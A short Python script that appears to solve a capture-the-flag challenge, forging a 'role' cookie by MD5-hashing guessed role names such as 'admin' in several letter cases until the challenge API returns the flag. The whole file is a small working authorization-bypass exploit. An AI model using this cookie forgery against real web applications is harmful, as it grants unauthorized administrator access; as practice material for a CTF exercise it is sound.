#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from itertools import product

from requests import Response, Session

from common import BASE_URL, cookies, headers, md5


url: str = f"{BASE_URL}/api/ctf/4"
guess_roles: list[str] = ["admin", "administrator"]


def solve(url: str, roles: list[str]) -> None:
    session: Session = Session()
    role_md5: str = None
    for role, method_name in product(roles, ["capitalize", "lower", "upper"]):
        role = getattr(role, method_name)()
        role_md5: str = md5(role)
        cookies["role"] = role_md5
        resp: Response = session.get(url=url, cookies=cookies, headers=headers)
        if resp.status_code != 200:
            print(f"error: {resp.status_code}")
            break

        data: dict[str, str] = resp.json()
        if data["code"] == 200:
            print(f'flag4: {data["data"]}, role: {role}')
            break
        print(f"error: {role} not work")


if __name__ == "__main__":
    solve(url=url, roles=guess_roles)
